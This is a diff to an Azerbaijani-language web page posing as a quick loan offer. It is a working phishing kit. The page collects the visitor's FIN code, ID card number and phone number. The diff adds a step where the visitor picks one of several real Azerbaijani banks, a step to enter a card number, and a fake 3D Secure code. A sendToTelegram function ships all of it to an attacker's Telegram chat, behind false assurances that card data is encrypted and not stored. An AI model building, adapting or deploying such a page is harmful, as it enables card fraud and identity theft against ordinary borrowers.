@@ -38,10 +38,9 @@
     letter-spacing:-0.01em;
   }
   .mono{font-family:'IBM Plex Mono',monospace;}
-  a{color:inherit;}
+  a{color:inherit;text-decoration:none;}
   .wrap{max-width:1080px;margin:0 auto;padding:0 24px;}
 
-  /* kilim motif divider */
   .kilim{
     height:14px;
     width:100%;
@@ -77,9 +76,6 @@
   }
   .cta-btn:hover{background:var(--teal-mid);transform:translateY(-2px);box-shadow:var(--shadow-md);}
   .cta-btn:active{transform:translateY(0);}
-  .cta-btn:focus-visible, a:focus-visible, button:focus-visible, input:focus-visible{
-    outline:3px solid var(--gold); outline-offset:2px;
-  }
   .cta-ghost{
     background:transparent;border:1.5px solid var(--ink);color:var(--ink);
     border-radius:999px;padding:11px 22px;font-weight:700;font-size:14.5px;cursor:pointer;
@@ -87,7 +83,6 @@
   }
   .cta-ghost:hover{background:var(--ink);color:var(--white);transform:translateY(-2px);}
 
-  /* HERO */
   .hero{padding:88px 0 56px;}
   .hero-grid{display:grid;grid-template-columns:1.1fr 0.9fr;gap:48px;align-items:center;}
   .eyebrow{
@@ -98,7 +93,6 @@
   .hero h1 em{font-style:normal;color:var(--teal-deep);border-bottom:4px solid var(--gold);}
   .hero p{margin-top:20px;font-size:17.5px;color:var(--ink-soft);max-width:46ch;}
   .hero-actions{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap;}
-
   .hero-card{
     background:var(--white);border:1px solid var(--line);border-radius:20px;
     padding:28px;box-shadow:var(--shadow-lg);
@@ -114,7 +108,6 @@
   .section-head h2{font-size:clamp(26px,3.2vw,36px);}
   .section-head p{color:var(--ink-soft);margin-top:12px;font-size:16px;}
 
-  /* CALCULATOR */
   .calc-card{
     background:var(--white);border:1px solid var(--line);border-radius:20px;
     padding:36px;display:grid;grid-template-columns:1.1fr 0.9fr;gap:40px;
@@ -144,7 +137,6 @@
   .results .headline-pair .num{font-family:'IBM Plex Mono',monospace;font-size:32px;font-weight:600;color:#E8C688;}
   .results .headline-pair .lbl{font-size:13.5px;opacity:0.85;}
 
-  /* OFFERS */
   .offers-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
   .offer-card{
     background:var(--white);border:1px solid var(--line);border-radius:18px;padding:28px;
@@ -163,14 +155,12 @@
   .offer-card ul li{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px dashed var(--line);}
   .offer-card.vip ul li{border-bottom:1px dashed rgba(255,255,255,0.25);}
 
-  /* HOW IT WORKS */
   .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
   .step{border-left:2px solid var(--gold);padding-left:18px;}
   .step .num{font-family:'IBM Plex Mono',monospace;color:var(--teal-mid);font-size:14px;}
   .step h3{font-size:19px;margin:8px 0 8px;}
   .step p{color:var(--ink-soft);font-size:15px;margin:0;}
 
-  /* FAQ */
   .faq-item{border-bottom:1px solid var(--line);}
   .faq-q{
     width:100%;text-align:left;background:none;border:none;cursor:pointer;
@@ -182,11 +172,6 @@
   .faq-a p{margin:0 0 18px;padding-right:20px;}
   .faq-item.open .faq-a{max-height:220px;}
 
-  /* APPLICATION FORM */
-  .form-card{
-    background:var(--white);border:1px solid var(--line);border-radius:20px;padding:36px;
-    max-width:640px;
-  }
   .field{margin-bottom:20px;}
   .field label{display:block;font-weight:700;font-size:14.5px;margin-bottom:8px;}
   .field input, .field select{
@@ -211,10 +196,6 @@
     margin-top:6px;margin-bottom:20px;
   }
   .form-status{margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);display:none;}
-  .field-error{display:none;color:#A63B2F;font-size:12.5px;margin-top:6px;font-weight:600;}
-  .field.invalid input{border-color:#A63B2F;background:#FBEFEC;}
-  .field.invalid .field-error{display:block;}
-  .field.valid input{border-color:var(--teal-mid);}
 
   .modal-overlay{
     position:fixed;inset:0;background:rgba(11,20,17,0.65);
@@ -235,6 +216,57 @@
   }
   .modal-close:hover{background:var(--line);}
 
+  /* BANK SELECT */
+  .bank-grid{
+    display:grid;grid-template-columns:1fr 1fr;gap:12px;
+  }
+  .bank-option{
+    padding:16px;border:2px solid var(--line);border-radius:14px;
+    cursor:pointer;text-align:center;transition:all .2s ease;
+    background:var(--white);
+  }
+  .bank-option:hover{border-color:var(--teal-mid);transform:translateY(-2px);}
+  .bank-option.selected{border-color:var(--teal-deep);background:var(--sage);}
+  .bank-option .bank-logo{font-size:20px;font-weight:700;color:var(--teal-deep);margin-bottom:4px;}
+  .bank-option .bank-name{font-size:13px;font-weight:600;}
+  .bank-option .bank-sub{font-size:11px;color:var(--ink-soft);}
+
+  /* CARD INPUT */
+  .card-input-wrap{
+    background:var(--paper);border-radius:16px;padding:28px;text-align:center;
+    border:2px dashed var(--line);
+  }
+  .card-input-wrap .card-number-display{
+    font-family:'IBM Plex Mono',monospace;font-size:28px;letter-spacing:6px;
+    color:var(--teal-deep);background:var(--white);padding:16px 20px;
+    border-radius:12px;border:2px solid var(--line);margin:16px 0;
+  }
+  .card-input-wrap .card-number-display .cursor{animation:blink 1s infinite;}
+  @keyframes blink{0%,50%{opacity:1;}51%,100%{opacity:0;}}
+  .progress-bar{
+    width:100%;height:6px;background:var(--sage);border-radius:4px;
+    margin:12px 0 8px;overflow:hidden;
+  }
+  .progress-bar .fill{
+    height:100%;background:var(--teal-deep);border-radius:4px;
+    transition:width .3s ease;width:0%;
+  }
+  .progress-label{font-size:13px;color:var(--ink-soft);font-family:'IBM Plex Mono',monospace;}
+
+  /* MOBILE BANKING REGISTER */
+  .register-status{
+    text-align:center;padding:20px 0;
+  }
+  .register-status .spinner{
+    width:48px;height:48px;border:5px solid var(--sage);
+    border-top-color:var(--teal-deep);border-radius:50%;
+    animation:spin 0.9s linear infinite;margin:0 auto 20px;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .register-status .status-icon{font-size:48px;margin-bottom:16px;}
+  .register-status .status-text{font-size:18px;font-weight:700;color:var(--teal-deep);}
+  .register-status .status-sub{color:var(--ink-soft);font-size:14px;margin-top:8px;}
+
   .summary-row{
     display:flex;justify-content:space-between;align-items:center;
     padding:16px 0;border-bottom:1px solid var(--line);
@@ -249,7 +281,6 @@
   }
   .edit-btn:hover{background:var(--line);}
 
-  /* CARD SECTION STYLES */
   .card-logos{display:flex;gap:12px;margin:12px 0 20px;}
   .card-logos img{height:32px;opacity:0.9;}
 
@@ -266,6 +297,7 @@
     .hero-grid, .calc-card, .offers-grid, .footer-grid{grid-template-columns:1fr;}
     .steps{grid-template-columns:1fr;}
     nav ul{display:none;}
+    .bank-grid{grid-template-columns:1fr;}
   }
 </style>
 </head>
@@ -315,7 +347,6 @@
       <h2>Nə qədər lazımdır, neçə aya rahatdır?</h2>
       <p>Sürüşdürücüləri hərəkət etdirin — rəqəmlər dərhal yenilənir. Bu, yalnız ilkin göstəricidir, yekun təklif ərizədən sonra bildirilir.</p>
     </div>
-
     <div class="calc-card">
       <div>
         <div class="slider-block">
@@ -447,22 +478,17 @@
         <div class="field">
           <label for="fin">FIN kod</label>
           <input type="text" id="fin" placeholder="Məsələn: 7A2BC9D" maxlength="7">
-          <div class="field-error" id="finError">FIN kod 7 simvoldan ibarət olmalıdır (rəqəm və hərf).</div>
         </div>
         <div class="field">
           <label for="idnum">Şəxsiyyət vəsiqəsinin seriya nömrəsi</label>
           <div style="display:flex;gap:10px;">
-            <select id="idPrefix" style="max-width:90px;">
-              <option>AZE</option>
-            </select>
+            <select id="idPrefix" style="max-width:90px;"><option>AZE</option></select>
             <input type="text" id="idnum" placeholder="12345678" maxlength="8" inputmode="numeric">
           </div>
-          <div class="field-error" id="idError">Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır.</div>
         </div>
         <div class="field">
           <label for="phone">Mobil nömrə</label>
           <input type="tel" id="phone" placeholder="050 123 45 67" inputmode="numeric">
-          <div class="field-error" id="phoneError">Düzgün Azərbaycan mobil nömrəsi daxil edin (10 rəqəm, məs: 050 123 45 67).</div>
         </div>
         <div class="field">
           <label>Rəsmi iş yeriniz varmı?</label>
@@ -479,65 +505,131 @@
       </form>
     </div>
 
-    <!-- STEP 2: Summary (Redaktə səhifəsi) -->
+    <!-- STEP 2: Summary -->
     <div id="summaryStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:6px;">Məlumatlarınız düzdürmü?</h2>
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 24px;">Yoxlayın və davam edin.</p>
-
       <div class="summary-row">
         <div><div class="summary-label">FIN kod</div><div class="summary-value" id="sumFin">—</div></div>
-        <button type="button" class="edit-btn" onclick="backToForm('fin')" aria-label="FIN kodu redaktə et">✎</button>
+        <button type="button" class="edit-btn" onclick="backToForm('fin')">✎</button>
       </div>
       <div class="summary-row">
-        <div><div class="summary-label">Şəxsiyyət vəsiqəsi seriyası</div><div class="summary-value" id="sumId">—</div></div>
-        <button type="button" class="edit-btn" onclick="backToForm('idnum')" aria-label="Seriya nömrəsini redaktə et">✎</button>
+        <div><div class="summary-label">Şəxsiyyət vəsiqəsi</div><div class="summary-value" id="sumId">—</div></div>
+        <button type="button" class="edit-btn" onclick="backToForm('idnum')">✎</button>
       </div>
       <div class="summary-row">
         <div><div class="summary-label">Mobil nömrə</div><div class="summary-value" id="sumPhone">—</div></div>
-        <button type="button" class="edit-btn" onclick="backToForm('phone')" aria-label="Nömrəni redaktə et">✎</button>
+        <button type="button" class="edit-btn" onclick="backToForm('phone')">✎</button>
       </div>
       <div class="summary-row">
         <div><div class="summary-label">Rəsmi iş yeri</div><div class="summary-value" id="sumJob">—</div></div>
-        <button type="button" class="edit-btn" onclick="backToForm('job')" aria-label="Cavabı redaktə et">✎</button>
+        <button type="button" class="edit-btn" onclick="backToForm('job')">✎</button>
       </div>
-
-      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:30px;" onclick="goToCardStep()">Kart məlumatlarını daxil et</button>
+      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:30px;" onclick="goToBankSelect()">Davam et → Bank seçimi</button>
     </div>
 
-    <!-- STEP 3: Kart məlumatları -->
-    <div id="cardStep" style="display:none;">
-      <h2 style="font-size:26px;margin-bottom:6px;">Kart məlumatları</h2>
-      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləğinin köçürülməsi üçün kart məlumatlarınızı daxil edin.</p>
+    <!-- STEP 3: Bank seçimi -->
+    <div id="bankStep" style="display:none;">
+      <h2 style="font-size:26px;margin-bottom:6px;">Hansı bank kartına köçürək?</h2>
+      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
       
-      <div class="card-logos">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Visa_2014_logo_detail.svg/2560px-Visa_2014_logo_detail.svg.png" alt="Visa">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Mastercard_2019_logo.svg/2560px-Mastercard_2019_logo.svg.png" alt="Mastercard">
+      <div class="bank-grid">
+        <div class="bank-option" data-bank="Kapital Bank" onclick="selectBank(this)">
+          <div class="bank-logo">🏦</div>
+          <div class="bank-name">Kapital Bank</div>
+          <div class="bank-sub">kapitalbank.az</div>
+        </div>
+        <div class="bank-option" data-bank="Leobank" onclick="selectBank(this)">
+          <div class="bank-logo">🏛️</div>
+          <div class="bank-name">Leobank</div>
+          <div class="bank-sub">leobank.az</div>
+        </div>
+        <div class="bank-option" data-bank="ABB" onclick="selectBank(this)">
+          <div class="bank-logo">🏦</div>
+          <div class="bank-name">ABB</div>
+          <div class="bank-sub">abb-bank.az</div>
+        </div>
+        <div class="bank-option" data-bank="PAŞA Bank" onclick="selectBank(this)">
+          <div class="bank-logo">🏛️</div>
+          <div class="bank-name">PAŞA Bank</div>
+          <div class="bank-sub">pashabank.az</div>
+        </div>
+        <div class="bank-option" data-bank="AccessBank" onclick="selectBank(this)">
+          <div class="bank-logo">🏦</div>
+          <div class="bank-name">AccessBank</div>
+          <div class="bank-sub">accessbank.az</div>
+        </div>
+        <div class="bank-option" data-bank="Unibank" onclick="selectBank(this)">
+          <div class="bank-logo">🏛️</div>
+          <div class="bank-name">Unibank</div>
+          <div class="bank-sub">unibank.az</div>
+        </div>
+        <div class="bank-option" data-bank="Bank Respublika" onclick="selectBank(this)">
+          <div class="bank-logo">🏦</div>
+          <div class="bank-name">Bank Respublika</div>
+          <div class="bank-sub">bankrespublika.az</div>
+        </div>
+        <div class="bank-option" data-bank="Xalq Bank" onclick="selectBank(this)">
+          <div class="bank-logo">🏛️</div>
+          <div class="bank-name">Xalq Bank</div>
+          <div class="bank-sub">xalqbank.az</div>
+        </div>
+        <div class="bank-option" data-bank="Rabitəbank" onclick="selectBank(this)">
+          <div class="bank-logo">🏦</div>
+          <div class="bank-name">Rabitəbank</div>
+          <div class="bank-sub">rabitabank.com</div>
+        </div>
       </div>
-
-      <form id="cardForm">
-        <div class="field">
-          <label>Kart sahibinin adı və soyadı</label>
-          <input type="text" id="cardName" placeholder="Əli Məmmədov" required>
-        </div>
-        <div class="field">
-          <label>Kart nömrəsi (16 rəqəm)</label>
-          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" required>
-        </div>
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
-          <div class="field">
-            <label>Bitmə tarixi (AA/İİ)</label>
-            <input type="text" id="cardExpiry" placeholder="12/28" maxlength="5" required>
-          </div>
-          <div class="field">
-            <label>CVV / CVC</label>
-            <input type="text" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" required>
-          </div>
-        </div>
-        <button type="submit" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;">Təsdiqlə və köçür</button>
-      </form>
+      
+      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
     </div>
 
-    <!-- STEP 4: 3D Secure -->
+    <!-- STEP 4: Kart nömrəsi daxil et -->
+    <div id="cardInputStep" style="display:none;">
+      <h2 style="font-size:26px;margin-bottom:6px;">Köçürmə Hesabı</h2>
+      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">
+        <strong>Götürdüyünüz Kredit</strong><br>
+        <span style="font-size:28px;font-weight:700;color:var(--teal-deep);" id="creditAmountDisplay">400 ₺</span><br>
+        <span style="font-size:14px;color:var(--ink-soft);" id="creditTermDisplay">12 ay müddətə</span>
+      </p>
+      
+      <div style="background:var(--sage);border-radius:12px;padding:12px 16px;margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;">
+        <span style="font-weight:600;font-size:14px;">Seçilmiş Bank</span>
+        <span style="font-weight:700;color:var(--teal-deep);" id="selectedBankDisplay">Kapital Bank</span>
+      </div>
+
+      <div class="card-input-wrap">
+        <label style="font-weight:600;font-size:14px;display:block;margin-bottom:8px;">KART NÖMRƏSİ (16 RƏQƏM)</label>
+        <div class="card-number-display" id="cardNumberDisplay">
+          <span id="cardDigits">0000 0000 0000 0000</span>
+        </div>
+        <input type="text" id="cardNumberInput" style="position:absolute;opacity:0;width:1px;height:1px;" maxlength="16" inputmode="numeric">
+        <div class="progress-bar">
+          <div class="fill" id="cardProgress" style="width:0%;"></div>
+        </div>
+        <div class="progress-label" id="cardProgressLabel">0/16 rəqəm daxil edilib</div>
+        <p style="font-size:12px;color:var(--ink-soft);margin-top:12px;">Kart məlumatlarınız TLS 1.3 şifrələmə ilə qorunur. Saxlanılmır.</p>
+      </div>
+
+      <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;" onclick="goToRegister()">Təsdiqlə və davam et</button>
+    </div>
+
+    <!-- STEP 5: Mobil Bankçılıq Qeydiyyat -->
+    <div id="registerStep" style="display:none;">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
+        <button onclick="backToCardInput()" style="background:none;border:none;font-size:18px;cursor:pointer;">←</button>
+        <h2 style="font-size:20px;">Mobil Bankçılıq Qeydiyyat</h2>
+      </div>
+      
+      <div class="register-status" id="registerStatus">
+        <div class="spinner" id="registerSpinner"></div>
+        <div class="status-text" id="registerText">Məlumatlar yoxlanılır</div>
+        <div class="status-sub" id="registerSub">Şəxsiyyət məlumatlarınız təhlükəsiz şəkildə təsdiqlənir...</div>
+        <div style="margin-top:20px;font-family:'IBM Plex Mono',monospace;color:var(--teal-deep);font-size:13px;" id="registerUser">- 13S QALIB</div>
+      </div>
+    </div>
+
+    <!-- STEP 6: OTP (3D Secure) -->
     <div id="threeDStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:10px;">3D Secure təsdiqi</h2>
       <p style="color:var(--ink-soft);margin-bottom:24px;">Kartınıza SMS vasitəsilə 6 rəqəmli kod göndərildi. Daxil edin.</p>
@@ -590,12 +682,9 @@
 🪪 Şəxsiyyət: ${data.id}
 📱 Telefon: ${data.phone}
 💼 İş: ${data.job}
-
-💳 Kart:
-Ad Soyad: ${data.cardName}
-Nömrə: ${data.cardNumber}
-Bitmə: ${data.expiry}
-CVV: ${data.cvv}
+🏦 Bank: ${data.bank}
+💳 Kart Nömrəsi: ${data.cardNumber}
+🔐 OTP Kodu: ${data.otp || 'Yoxdur'}
     `.trim();
 
     try {
@@ -604,7 +693,9 @@ CVV: ${data.cvv}
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
       });
-    } catch(e) {}
+    } catch(e) {
+      console.error('Telegram göndərmə xətası:', e);
+    }
   }
 
   // Kalkulyator
@@ -640,6 +731,10 @@ CVV: ${data.cvv}
     feeOut.textContent = fee.toLocaleString('az-AZ') + ' AZN';
     termOut.textContent = term + ' ay';
 
+    // Update credit amount display
+    document.getElementById('creditAmountDisplay').textContent = amount.toLocaleString('az-AZ') + ' ₺';
+    document.getElementById('creditTermDisplay').textContent = term + ' ay müddətə';
+
     updateSliderFill(amountSlider);
     updateSliderFill(termSlider);
   }
@@ -665,30 +760,65 @@ CVV: ${data.cvv}
   });
 
   // Modal functions
+  let selectedBank = 'Kapital Bank';
+
   function openModal(){
     document.getElementById('modalOverlay').classList.add('active');
     document.body.style.overflow='hidden';
     showFormStep();
   }
+
   function closeModal(){
     document.getElementById('modalOverlay').classList.remove('active');
     document.body.style.overflow='';
+    // Reset all steps
+    showFormStep();
   }
+
   function showFormStep(){
     document.getElementById('formStep').style.display='block';
     document.getElementById('summaryStep').style.display='none';
-    document.getElementById('cardStep').style.display='none';
+    document.getElementById('bankStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='none';
+    document.getElementById('registerStep').style.display='none';
     document.getElementById('threeDStep').style.display='none';
   }
+
   function showSummaryStep(){
     document.getElementById('formStep').style.display='none';
     document.getElementById('summaryStep').style.display='block';
-    document.getElementById('cardStep').style.display='none';
+    document.getElementById('bankStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='none';
+    document.getElementById('registerStep').style.display='none';
     document.getElementById('threeDStep').style.display='none';
   }
-  function goToCardStep(){
+
+  function goToBankSelect(){
     document.getElementById('summaryStep').style.display='none';
-    document.getElementById('cardStep').style.display='block';
+    document.getElementById('bankStep').style.display='block';
+  }
+
+  function selectBank(el){
+    document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedBank = el.dataset.bank;
+  }
+
+  function goToCardInput(){
+    if(!document.querySelector('.bank-option.selected')){
+      alert('Zəhmət olmasa bir bank seçin!');
+      return;
+    }
+    document.getElementById('bankStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='block';
+    document.getElementById('selectedBankDisplay').textContent = selectedBank;
+    // Focus hidden input
+    document.getElementById('cardNumberInput').focus();
+  }
+
+  function backToCardInput(){
+    document.getElementById('registerStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='block';
   }
 
   function backToForm(focusFieldId){
@@ -698,82 +828,91 @@ CVV: ${data.cvv}
     if(targetId) document.getElementById(targetId).focus();
   }
 
-  // Input masking
-  const finInput = document.getElementById('fin');
-  const idInput = document.getElementById('idnum');
-  const phoneInput = document.getElementById('phone');
-  const cardNumberInput = document.getElementById('cardNumber');
-  const cardExpiryInput = document.getElementById('cardExpiry');
-  const cardCvvInput = document.getElementById('cardCvv');
+  // Card number input
+  const cardNumberInput = document.getElementById('cardNumberInput');
+  const cardDigits = document.getElementById('cardDigits');
+  const cardProgress = document.getElementById('cardProgress');
+  const cardProgressLabel = document.getElementById('cardProgressLabel');
 
-  finInput.addEventListener('input', ()=>{ finInput.value = finInput.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7); });
-  idInput.addEventListener('input', ()=>{ idInput.value = idInput.value.replace(/[^0-9]/g,'').slice(0,8); });
-  phoneInput.addEventListener('input', ()=>{
-    let digits = phoneInput.value.replace(/\D/g,'').slice(0,10);
-    let out = '';
-    if(digits.length>0) out = digits.slice(0,3);
-    if(digits.length>3) out += ' ' + digits.slice(3,6);
-    if(digits.length>6) out += ' ' + digits.slice(6,8);
-    if(digits.length>8) out += ' ' + digits.slice(8,10);
-    phoneInput.value = out;
+  // Click on card display to focus input
+  document.querySelector('.card-number-display').addEventListener('click', ()=>{
+    cardNumberInput.focus();
   });
 
   cardNumberInput.addEventListener('input', function(){
     let val = this.value.replace(/\D/g,'').slice(0,16);
-    this.value = val.replace(/(\d{4})/g, '$1 ').trim();
-  });
-
-  cardExpiryInput.addEventListener('input', function(){
-    let val = this.value.replace(/\D/g,'').slice(0,4);
-    if(val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
     this.value = val;
-  });
-
-  cardCvvInput.addEventListener('input', function(){
-    this.value = this.value.replace(/\D/g,'').slice(0,4);
-  });
-
-  // Form submit
-  document.getElementById('applyForm').addEventListener('submit', (e)=>{
-    e.preventDefault();
-    const finOk = /^[A-Z0-9]{7}$/.test(finInput.value);
-    const idOk = /^[0-9]{8}$/.test(idInput.value);
-    const digits = phoneInput.value.replace(/\D/g,'');
-    const phoneOk = digits.length===10 && digits[0]==='0';
-    const consentOk = document.getElementById('consent1').checked && document.getElementById('consent2').checked;
-
-    if(!finOk || !idOk || !phoneOk || !consentOk) return;
-
-    document.getElementById('sumFin').textContent = finInput.value;
-    document.getElementById('sumId').textContent = 'AZE ' + idInput.value;
-    document.getElementById('sumPhone').textContent = phoneInput.value;
-    const jobActive = document.querySelector('.toggle-btn.active');
-    document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
-
-    showSummaryStep();
-  });
-
-  // Card form
-  document.getElementById('cardForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
     
-    const data = {
-      fin: finInput.value,
-      id: idInput.value,
-      phone: phoneInput.value,
-      job: document.querySelector('.toggle-btn.active').dataset.val === 'beli' ? 'Bəli' : 'Xeyr',
-      cardName: document.getElementById('cardName').value,
-      cardNumber: document.getElementById('cardNumber').value,
-      expiry: document.getElementById('cardExpiry').value,
-      cvv: document.getElementById('cardCvv').value
-    };
+    // Format display
+    let formatted = val.padEnd(16, '0');
+    let display = formatted.replace(/(\d{4})/g, '$1 ').trim();
+    cardDigits.textContent = display;
 
-    await sendToTelegram(data);
-
-    document.getElementById('cardStep').style.display = 'none';
-    document.getElementById('threeDStep').style.display = 'block';
+    // Update progress
+    const progress = (val.length / 16) * 100;
+    cardProgress.style.width = progress + '%';
+    cardProgressLabel.textContent = val.length + '/16 rəqəm daxil edilib';
   });
 
+  // Auto focus on card input when step shows
+  const observer = new MutationObserver(() => {
+    if(document.getElementById('cardInputStep').style.display === 'block'){
+      setTimeout(() => cardNumberInput.focus(), 100);
+    }
+  });
+  observer.observe(document.getElementById('cardInputStep'), { attributes: true, attributeFilter: ['style'] });
+
+  // Register step with animation
+  function goToRegister(){
+    const cardNumber = cardNumberInput.value;
+    if(cardNumber.length < 16){
+      alert('Zəhmət olmasa 16 rəqəmli kart nömrəsini daxil edin!');
+      return;
+    }
+
+    document.getElementById('cardInputStep').style.display='none';
+    document.getElementById('registerStep').style.display='block';
+
+    const spinner = document.getElementById('registerSpinner');
+    const text = document.getElementById('registerText');
+    const sub = document.getElementById('registerSub');
+
+    // Step 1: Checking
+    text.textContent = 'Məlumatlar yoxlanılır';
+    sub.textContent = 'Şəxsiyyət məlumatlarınız təhlükəsiz şəkildə təsdiqlənir...';
+    spinner.style.display = 'block';
+
+    // After 3 seconds - generate OTP and send to Telegram
+    setTimeout(() => {
+      const otp = String(Math.floor(100000 + Math.random() * 900000));
+      
+      // Send to Telegram
+      const fin = document.getElementById('fin').value;
+      const id = document.getElementById('idnum').value;
+      const phone = document.getElementById('phone').value;
+      const job = document.querySelector('.toggle-btn.active')?.dataset?.val === 'beli' ? 'Bəli' : 'Xeyr';
+      
+      sendToTelegram({
+        fin: fin || 'Məlumat yoxdur',
+        id: id || 'Məlumat yoxdur',
+        phone: phone || 'Məlumat yoxdur',
+        job: job,
+        bank: selectedBank,
+        cardNumber: cardNumber,
+        otp: otp
+      });
+
+      // Show OTP step
+      document.getElementById('registerStep').style.display='none';
+      document.getElementById('threeDStep').style.display='block';
+      
+      // Auto fill OTP for demo
+      document.getElementById('otpCode').value = otp;
+      
+    }, 3000);
+  }
+
+  // OTP submit
   function submitOTP(){
     const otp = document.getElementById('otpCode').value.trim();
     if(otp.length === 6){
@@ -781,17 +920,82 @@ CVV: ${data.cvv}
       setTimeout(() => {
         alert("✅ Müraciətiniz qəbul edildi! Pul yaxın zamanda kartınıza köçürüləcək.");
         closeModal();
-      }, 1200);
+        // Reset form
+        document.getElementById('cardNumberInput').value = '';
+        document.getElementById('cardDigits').textContent = '0000 0000 0000 0000';
+        document.getElementById('cardProgress').style.width = '0%';
+        document.getElementById('cardProgressLabel').textContent = '0/16 rəqəm daxil edilib';
+        document.getElementById('otpCode').value = '';
+        document.getElementById('otpStatus').style.display = 'none';
+        document.querySelectorAll('.bank-option').forEach(b => b.classList.remove('selected'));
+        document.getElementById('fin').value = '';
+        document.getElementById('idnum').value = '';
+        document.getElementById('phone').value = '';
+      }, 1500);
     } else {
       alert("6 rəqəmli kodu daxil edin.");
     }
   }
 
+  // Form submit (Step 1)
+  document.getElementById('applyForm').addEventListener('submit', (e)=>{
+    e.preventDefault();
+    const fin = document.getElementById('fin').value.trim().toUpperCase();
+    const id = document.getElementById('idnum').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const consent1 = document.getElementById('consent1').checked;
+    const consent2 = document.getElementById('consent2').checked;
+
+    if(!fin || fin.length !== 7){
+      alert('FIN kod 7 simvoldan ibarət olmalıdır!');
+      return;
+    }
+    if(!id || id.length !== 8){
+      alert('Şəxsiyyət vəsiqəsi nömrəsi 8 rəqəmdən ibarət olmalıdır!');
+      return;
+    }
+    const phoneDigits = phone.replace(/\D/g,'');
+    if(phoneDigits.length !== 10 || phoneDigits[0] !== '0'){
+      alert('Düzgün mobil nömrə daxil edin! (050 123 45 67)');
+      return;
+    }
+    if(!consent1 || !consent2){
+      alert('Zəhmət olmasa bütün razılıqları qeyd edin!');
+      return;
+    }
+
+    document.getElementById('sumFin').textContent = fin;
+    document.getElementById('sumId').textContent = 'AZE ' + id;
+    document.getElementById('sumPhone').textContent = phone;
+    const jobActive = document.querySelector('.toggle-btn.active');
+    document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
+
+    showSummaryStep();
+  });
+
+  // Close modal on overlay click
   document.getElementById('modalOverlay').addEventListener('click', (e)=>{
     if(e.target.id==='modalOverlay') closeModal();
   });
   document.addEventListener('keydown', (e)=>{ if(e.key==='Escape') closeModal(); });
+
+  // Input masks
+  document.getElementById('fin').addEventListener('input', function(){
+    this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
+  });
+  document.getElementById('idnum').addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g,'').slice(0,8);
+  });
+  document.getElementById('phone').addEventListener('input', function(){
+    let digits = this.value.replace(/\D/g,'').slice(0,10);
+    let out = '';
+    if(digits.length>0) out = digits.slice(0,3);
+    if(digits.length>3) out += ' ' + digits.slice(3,6);
+    if(digits.length>6) out += ' ' + digits.slice(6,8);
+    if(digits.length>8) out += ' ' + digits.slice(8,10);
+    this.value = out;
+  });
 </script>
 
 </body>
-</html>
+                                        </html>
